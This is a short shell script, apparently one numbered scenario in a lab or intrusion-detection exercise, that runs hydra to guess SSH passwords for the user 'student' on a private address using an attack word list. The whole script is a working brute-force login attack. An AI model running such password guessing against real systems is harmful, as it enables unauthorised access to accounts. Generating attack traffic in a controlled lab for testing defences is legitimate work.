#!/bin/sh
# Scenario 2 - unauthorised access: SSH password guessing with a small word list
# -t 4: 4 parallel tasks, -f: stop at the first valid password, -I: ignore old restore file
hydra -I -t 4 -f -l student -P /attacks/passwords.txt ssh://172.28.0.10
